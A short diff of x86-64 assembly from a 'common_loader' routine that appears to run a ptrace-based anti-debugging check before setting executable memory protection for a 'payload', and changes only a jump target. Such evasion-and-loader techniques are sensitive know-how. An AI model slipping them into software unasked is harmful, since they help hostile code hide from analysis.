@@ -38,7 +38,7 @@ common_loader:
 	mov rax, 0x65
 	syscall
 	cmp eax, 0
-	jl 0x74 ; je FOR DEBUG, jl FOR TRUE
+	jl 0xB5 ; je FOR DEBUG, jl FOR TRUE
     mov rdx, 0x7 ;EXEC | READ
     mov rsi, 0x25B0; size payload + 1 page
 p1:
